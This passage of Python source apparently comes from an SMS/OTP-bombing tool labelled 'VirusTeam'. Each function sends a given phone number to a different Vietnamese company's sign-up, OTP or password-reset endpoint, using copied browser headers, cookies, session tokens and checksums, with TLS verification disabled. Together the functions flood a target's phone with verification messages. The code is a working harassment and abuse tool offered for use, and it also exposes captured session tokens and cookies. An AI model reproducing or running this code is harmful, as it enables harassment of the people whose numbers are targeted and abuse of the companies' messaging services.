        'recaptcha': '03AFcWeA7k7xTO-mWbrjVz2PZ9x-n9aq6g1xwVO4rLyuQdURsV9tGIC8J3GO2KbrsA0-Sm9xcvRH5VmR75FY-2FDO2GV3Iy_ZIIH8F-8RdvFMl2Um9qdr9Zsyrf7zDrw6QCA7yDSo0lHfSO_Ja1hcoHodAjUIIXI52Gqfr9nJGotdUiNuobzxW1ADC4_1y9zRUdCNZVobRZfR_eE-ZA2r_PbXoWLhp5KzeLWWXIT6Al15ZdSeC5AfGzs1pVYO9a2ZuW3x4vFYU_Z7Jfl784gjS8EMAQpCZSHcxx9c6dvTZNRliFjymEWyD6ps09g9wFg1SoYjRrSjqMOlZijxS04RQ5UalO4DW1JVF4jYq5OMX0GXD-R6-S1_M9KBTN46B4HYnww_PPv5cauuWtBNwoWik8IInjUr_TdqIH2h__vXukXMt-fs7LJll_rHKQVtjJT3IQBWHbPOTSfAk7ehHFg5Zi7TgHaJsrdjej4T8fN53cqXV9Mu9utFNpOK7Fdrk9_iaUWPewcZ3QukyzVRCD--v5rnw58hM493AamrQsYbqrcOL6fOK-8nO6Ps2M7k-nfLOdN9vYyYpl4w1xvQfjw3oJ2UUwy4ANKHPTM2_B4FyVru8fhyGdwM367t2E3mliLsz2A0HzKzGBk3A51f8KY_c0CDjMbRitcMFHsdQkjuRgGi69tfQ_nPaWAU5ox7nvjeDzBBW6ojQMz2iHciPtsKISt5_pkDJ5BW9W38GqAvUqz48JQPuXa6LQwfaFWvfN5nCTu4ru4mLyjqR_th7DS2A3USqmIMAbMDtXL2oyCMk_OBmQoQv9T2_cqBWCemjTmKOCdAeBK18MNW2ugpnIN0lDUtxqFUVRYKRWiQIv75QQXoe8xO4uXxBb8Ee95pCQIeaRWL2G5lvj5z1P4jiKUJ_8EK5yFYp1y_utA8NIJ6sZNyxA8BW2X1NcqJM4NaDDhDP4MaAHFqNbmlX7rQvJjLJd_PviL855FMVuF6lFGAY2l3p8SLrGYnqH4RWg1bMU_Hu1cLdmLSD6eA4BsrkIXpTyXGQLL97GBoYgARVdvgofYSz7pVwicRPUXfkMzLo4TF-HFsAcI91-RFB3ZTKXJUsKEbmIA_BRBY4oWAYCsnFVW_cTGCaaRpECLOF06bAjjoDokEizIEXKO1rDgbl-30kjfM29Yp9QY8FC_NaUEcRQvGF4JB6bAhEU3mL3lvu1Y5AcvtCJyKHcf5due0hnZun1vAaHoY5OscicczZIRl2ldGrwpy1PmlEbkQuU9aAYwebMF9X6vaVPZmf8qYRB467_r31Y4maNgVET7I520vabSTd0S3BQ5cAiB4JhMoKUO5Ky_OtVlHezMdx20CVXxtDXFf4gHpQYRkOCwxcNvvZQZrtcI52wDXCc_oK3ze9zVCrD0249gMiy9YapELDGBSQ6IEd42WJdZWON1kDK5Gj9FM0RVkhnwovPHUUo3iwBzZMfAYivDvnkIA9dKyR8fJ55tWcUmL5INvpAxu2WQE5DIIYDwVa2UTd4k1XI-vgiV_zSsY7hMcCPhHDsyDGyz2avKG5QhFgzxp8Womf715LS8ZopD4M0GNnUptiRxKb3VQt1wkhfGtCjXYolZX8YJ12X4y3abYOf65A4w',
    }
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests22(sdt_vs):
    VirusTeam_Url = 'https://v9-cc.800best.com/uc/account/sendSignUpCode'
    headers = {
        "host": "v9-cc.800best.com",
        "connection": "keep-alive",
        "content-length": "53",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "x-timezone-offset": "7",
        "x-auth-type": "web-app",
        "x-nat": "vi-VN",
        "x-lan": "VI",
        "sec-ch-ua-mobile": "?0",
        "authorization": "null",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "content-type": "application/json",
        "accept": "application/json",
        "lang-type": "vi-VN",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://best-inc.vn",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://best-inc.vn/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
    }
    cookies = {
        
    }
    payload = {
    "phoneNumber": sdt_vs,
    "verificationCodeType": 1
}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests23(sdt_vs):
    VirusTeam_Url = 'https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN'
    headers = {
        "host": "api.alfrescos.com.vn",
        "connection": "keep-alive",
        "content-length": "124",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "accept-language": "vi-VN",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "content-type": "application/json",
        "accept": "application/json, text/plain, */*",
        "brandcode": "ALFRESCOS",
        "devicecode": "web",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://alfrescos.com.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://alfrescos.com.vn/",
        "accept-encoding": "gzip, deflate, br, zstd"
    }
    cookies = {
        
    }
    payload = {
    "phoneNumber": sdt_vs,
    "secureHash": "957ca29d8658907bcc2774e88fbb7f10",
    "deviceId": "",
    "sendTime": 1719577052938,
    "type": 1
}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests24(sdt_vs):
    VirusTeam_Url = 'https://api.popeyes.vn/api/v1/register'
    headers = {
        "host": "api.popeyes.vn",
        "content-length": "116",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "content-type": "application/json",
        "accept": "application/json",
        "x-client": "WebApp",
        "ppy": "DQNNBO",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://popeyes.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://popeyes.vn/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=1, i"
    }
    cookies = {
        "_ga": "GA1.1.1939316405.1719576273",
        "_fbp": "fb.1.1719576277915.326175377898231530",
        "_ga_GFJFDNFKH2": "GS1.1.1719576272.1.1.1719576284.0.0.0",
        "_gcl_au": "1.1.1990400277.1719576270.738059699.1719576310.1719576309"
    }
    payload = {
    "phone": sdt_vs,
    "firstName": "Virus",
    "lastName": "Tmr",
    "email": "raofficialvirus@gmail.com",
    "password": "123456@"
}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests25(sdt_vs):
    VirusTeam_Url = 'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=4V80j5oPKflEHjnGdLHRRw&e=1719581114&device=Chrome(version%253A126.0.0.0)&drm=1'
    headers = {
        "host": "api.fptplay.net",
        "content-length": "89",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json; charset=UTF-8",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "x-did": "4F280896DE84EFA1",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://fptplay.vn",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://fptplay.vn/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=1, i"
    }
    cookies = {
        
    }
    payload = {
    "phone": sdt_vs,
    "country_code": "VN",
    "client_id": "vKyPNd1iWHodQVknxcvZoWz74295wnk8"
}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests26(sdt_vs):
    VirusTeam_Url = 'https://api.ahamove.com/api/v3/public/user/register'
    headers = {
        "host": "api.ahamove.com",
        "content-length": "490",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json;charset=UTF-8",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://app.ahamove.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://app.ahamove.com/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=1, i"
    }
    cookies = {
        
    }
    payload = {
    "mobile": sdt_vs,
    "name": "Tmr Virus",
    "email": "123@tmr.gov.vn",
    "country_code": "VN",
    "firebase_sms_auth": "true",
    "time": 1719577743,
    "checksum": "OkUnoWuAtYBz2UblvNdpYEwAvOlbbNHgow/ATrGrKuNG6JpCkCyYcleAyvdQsAjvKec56Kb1/5b9EZAMWeBrgvY78r8o81CBZ57hRRlJIyexteI8u6o9MfB6UKTaupTB7+G3qqdUr/tpOFzYE/3LB4oQCDIcpp8maSzyH8y3XDjvZiDpd2Cuh7K/M1TbtQWNukbbmOKf0aS6HJf0ubUwjJFtA/ofyzkV2LMGzk9R7tM13/aldwQA5wacCweoq0aToFBoeTpjMZETKt7cjMYCleP/fJ1om8pBQbPwKWjV0qbzwtzsS8Tcjxi6M7wje+gxj5no2bEakA0DZcW5HfkBOA=="
}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests27(sdt_vs):
    Batdongsan_Api = f'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister'
    params = {
        'phoneNumber': sdt_vs
    }
    response = requests.get(Batdongsan_Api, params=params)
def VsTeamHttpRequests28(sdt_vs):
    VirusTeam_Url = 'https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1'
    headers = {
        "host": "meta.vn",
        "content-length": "80",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://meta.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://meta.vn/account/register",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=1, i"
    }
    cookies = {
        "_ssid": "3mhnlkzvzn4osfijga14eh14",
        "_cart_": "3788aaa1-51e8-40ca-bbcd-afccffc10b1b",
        "__ckmid": "4e8af80779c34931825bbd9c7e296141",
        "_gcl_au": "1.1.228204346.1719674324",
        "_gid": "GA1.2.681861552.1719674325",
        "_gat_UA-1035222-8": "1",
        "_clck": "1vwf3bq%7C2%7Cfn1%7C0%7C1641",
        "_ga": "GA1.1.19237821.1719674325",
        "_clsk": "17ahmgb%7C1719674335724%7C2%7C1%7Cw.clarity.ms%2Fcollect",
        "_ga_YE9QV6GZ0S": "GS1.1.1719674326.1.1.1719674355.0.0.0",
        "_ga_L0FCVV58XQ": "GS1.1.1719674325.1.1.1719674369.16.0.0"
    }
    payload = {
    "api_args": {
        "lgUser": sdt_vs,
        "type": "phone"
    },
    "api_method": "CheckRegister"
}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests29(sdt_vs):
    VirusTeam_Url = 'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification'
    headers = {
        "host": "beautybox-api.hsv-tech.io",
        "content-length": "30",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "accept-language": "vi",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "content-type": "application/json",
        "accept": "application/json, text/plain, */*",
        "timestamp": "1720934157633",
        "key": "941baf4b25c1a98df432de9f2f9109f5",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://beautybox.com.vn",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://beautybox.com.vn/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "priority": "u=1, i"
    }
    cookies = {
        
    }
    payload = {
    "phoneNumber": "84" + sdt_vs
}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests30(sdt_vs):
    VirusTeam_Url = 'https://shop.login.net.vn/apimobi/v1/check-phone'
    headers = {
        "host": "shop.login.net.vn",
        "content-length": "16",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "sec-ch-ua-mobile": "?0",
        "wm-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJTZXNzaW9uS2V5IjoiNjc1MEE5OTc3QzQ0Mzc4ODk1RDQzRTZGMEQxQTdGQTQiLCJVc2VySWQiOjAsIkRldmljZUlkIjoiQUM0ODVDMzYxODcyMDM5NUJBMjQ0QUIzNzZENDUzQTgiLCJEZXZpY2VJbmZvIjoiIiwiaWF0IjoxNzE5Njc3NTY3OTU0LCJuYmYiOjE3MTk2Nzc1Njc5NTQsImV4cCI6MTcxOTY3OTM2Nzk1M30.C97D8A63B7D388711E1BC2C0B21627567A955AB1340CB4251DD9DF106AA3EE3F",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "content-type": "application/x-www-form-urlencoded",
        "access-control-allow-origin": "*",
        "accept": "application/json, text/plain, */*",
        "wm-time": "1719677943969",
        "wm-device": "AC485C3618720395BA244AB376D453A8",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://shop.login.net.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://shop.login.net.vn/sign-up",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=1, i"
    }
    cookies = {
        "_ga": "GA1.1.69762416.1719677559",
        "_ga_5KED5SHEXB": "GS1.1.1719677559.1.1.1719677575.0.0.0"
    }
    payload = {
        "phone": sdt_vs
    }
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, data=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests31(sdt_vs):
    VirusTeam_Url = 'https://www.fahasa.com/ajaxlogin/ajax/checkPhone'
    headers = {
        "host": "www.fahasa.com",
        "content-length": "16",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "traceparent": "00-3051c1f261744b64a0084316d6e660f9-546637b8bc42c5ec-01",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://www.fahasa.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=1, i"
    }
    cookies = {
        "frontend": "50cee0506a484a4882433d3d78923c8c",
        "_ga": "GA1.1.2059856487.1719678754",
        "_gcl_au": "1.1.1105112745.1719678755",
        "frontend_cid": "D27ze0GrvTwzvcSj",
        "_fbp": "fb.1.1719678764593.504182357652336851",
        "_tt_enable_cookie": "1",
        "_ttp": "4x0gHz1KpT3rw_PhHnD2mKJU5q9",
        "_ga_460L9JMC2G": "GS1.1.1719678754.1.1.1719678790.24.0.1299999816",
        "_clck": "10eqfbq%7C2%7Cfn1%7C0%7C1641"
    }
    payload = {
        "phone": sdt_vs
}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, data=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests32(sdt_vs):
    VirusTeam_Url = 'https://www.pnj.com.vn/customer/otp/request'
    headers = {
        "host": "www.pnj.com.vn",
        "content-length": "73",
        "cache-control": "max-age=0",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Android\"",
        "upgrade-insecure-requests": "1",
        "origin": "https://www.pnj.com.vn",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "referer": "https://www.pnj.com.vn/customer/otp/verify",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=0, i"
    }
    cookies = {
        "_atm_objs": "eyJzb3VyY2UiOiIiLCJtZWRpdW0iOiIiLCJjYW1wYWlnbiI6IiIsImNvbnRlbnQiOiIiLCJ0ZXJt%0D%0AIjoiIiwidHlwZSI6IiIsImNoZWNrc3VtIjoiKiJ9",
        "_pk_ref.564990245.4a15": "%5B%22%22%2C%22%22%2C1719680322%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D",
        "_pk_ses.564990245.4a15": "*",
        "_gcl_au": "1.1.1840372616.1719680323",
        "_cdp_cfg": "1",
        "_cdp_fsid": "3077414480162210",
        "_asm_visitor_type": "n",
        "au_id": "1539073525",
        "_ac_au_gt": "1719680323619",
        "_gid": "GA1.3.1219695026.1719680324",
        "_clck": "vw6hy5%7C2%7Cfn1%7C0%7C1641",
        "_tt_enable_cookie": "1",
        "_ttp": "3Eno56XKsq-9FMVNy-kyF1m_10u",
        "_fbp": "fb.2.1719680329529.427028773998635300",
        "XSRF-TOKEN": "eyJpdiI6ImVSY1V2VFRlYTk5Y0hlRFljNTJmOFE9PSIsInZhbHVlIjoiaVl5QWd5b2FyZ210MHdrS2lBMkFQNytYK2hYT0MvZjlGTkdFS3dVYmhKelFsd3dZNkRHUEhDRkd2NWJHL1VRcE93dEF4YW11dHpjb0c2cDA0dkFoZlhVVk9Sc3pTVktHSnBFajRhcy9PL0U3ZzRsWHMrYnh1dVEwUW1JSVRHcDYiLCJtYWMiOiIzNTE3YTkxZWI1ZWNmYjA2NmFjYTIxZDZiMmY3MzVhZjkzNTg5YTQ5YWNiMzA2YzUxZTFjMzJiOTBmNzVkOWFlIiwidGFnIjoiIn0%3D",
        "mypnj_session": "eyJpdiI6InRTVzdsUkc3S20rN01LaUdVRENKQUE9PSIsInZhbHVlIjoiN0cyUHVBRXduVmNHbmREV3htRWwxTXNqWWpoM08xaGN0QmNWQ0RVbDU5YStVVVFJUWhWTlZVSVhRNnJNdFVKYzdvdWFTUklBSXY0MVB4UmZFNHJqUjA2Q1lwcUZBeStXRkdRRXdUY1BtS2xJQW1CZnVXMmZXcXFHaXg0RUVVL24iLCJtYWMiOiIyYzlmY2QyOGY2ZmMyMDcwMWJiMzk3ZTc5YzRmM2FkZjYwMjY1MzA1NGUxNjZmZWY3ZjgyNzg3MzRhYTQ1ZDY1IiwidGFnIjoiIn0%3D",
        "_asm_uid": "1539073525",
        "_asm_ss_view": "%7B%22time%22%3A1719680322716%2C%22sid%22%3A%223077414480162210%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222024-06-29T16%3A59%3A07%22%2C%22duration%22%3A24755%7D",
        "_ga_3S12QVTD78": "GS1.1.1719680323.1.1.1719680347.36.0.0",
        "_clsk": "lz7x00%7C1719680350248%7C2%7C1%7Cp.clarity.ms%2Fcollect",
        "_ga": "GA1.3.1683899788.1719680324",
        "_ga_TN4J88TP5X": "GS1.3.1719680329.1.1.1719680356.33.0.0",
        "_pk_id.564990245.4a15": "1539073525.1719680322.1.1719680392.1719680322.",
        "_ac_client_id": "1539073525.1719680393",
        "_ac_an_session": "zgzjzkzkznziznznzrzjzizlzhzhzizjzdzizmzgzqzjzkzgzmzhzmzdzizkzizqzlzrzjzgzqzgzdzizdzizkzizqzlzrzjzgzqzgzdzizkzizqzlzrzjzgzqzgzdzizdzhzqzdzizd2f27zdzgzdzlzmzkzjzlzdzd3226z82q2524z835242725z82q242h2k"
    }
    payload = {
        "_token": "CMZ0cnrCLwVFoMzFlYxXVpMCQilCXoTGKqAgLOfc",
        "phone": sdt_vs,
        "type": "zns"
    }
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, data=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests33(sdt_vs):
    if len(sdt_vs) == 10 and sdt_vs.startswith('0'):
        sdt_vs = '+84' + sdt_vs[1:]
    VirusTeam_Url = 'https://app-api.selly.vn/users/request-otp'
    headers = {
        "host": "app-api.selly.vn",
        "connection": "keep-alive",
        "content-length": "98",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "app-version": "1.0.0",
        "device-type": "tablet",
        "os-version": "10",
        "os-name": "Browser",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "content-type": "application/json;charset=UTF-8",
        "accept": "application/json",
        "browser-version": "126",
        "app-version-code": "10000",
        "platform": "Web",
        "browser-name": "Chrome",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://selly.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://selly.vn/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
    }
    cookies = {}
    payload = {
        "phone": sdt_vs,
        "forceSendSms": True,
        "checksum": "14ec77936191e28d94237d51cabd630dd6f9adc7"
    }
    
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests34(sdt_vs):
    VirusTeam_Url = 'https://api.vayvnd.vn/v2/users/password-reset'
    headers = {
        "host": "api.vayvnd.vn",
        "content-length": "102",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "accept-language": "vi-VN",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "content-type": "application/json; charset=utf-8",
        "accept": "application/json",
        "site-id": "3",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://vayvnd.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://vayvnd.vn/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "priority": "u=1, i"
    }
    cookies = {
        "_gcl_au": "1.1.385980118.1719542859",
        "_fbp": "fb.1.1719542859621.324969180727837773",
        "_tt_enable_cookie": "1",
        "_ttp": "f2Atu8cymWvKX_bOWYiohRUmipS",
        "_ym_uid": "1719542868869277925",
        "_ym_d": "1719542868",
        "_gcl_gs": "2.1.k1$i1719704134",
        "_gcl_aw": "GCL.1719704138.CjwKCAjw4f6zBhBVEiwATEHFVv3b6npA7j2Zw9WpPMqMxEOHw8-SvikbaKPy1v5Am5UcLbhE6k4u6BoCmo0QAvD_BwE",
        "_ga": "GA1.2.310733126.1719542861",
        "_gid": "GA1.2.1355668930.1719704139",
        "_gac_UA-151110385-1": "1.1719704139.CjwKCAjw4f6zBhBVEiwATEHFVv3b6npA7j2Zw9WpPMqMxEOHw8-SvikbaKPy1v5Am5UcLbhE6k4u6BoCmo0QAvD_BwE",
        "_gat_UA-151110385-1": "1",
        "_ym_isad": "2",
        "_ym_visorc": "b",
        "_ga_P2783EHVX2": "GS1.1.1719704137.3.1.1719704156.41.0.0"
    }
    payload = {
    "login": sdt_vs,
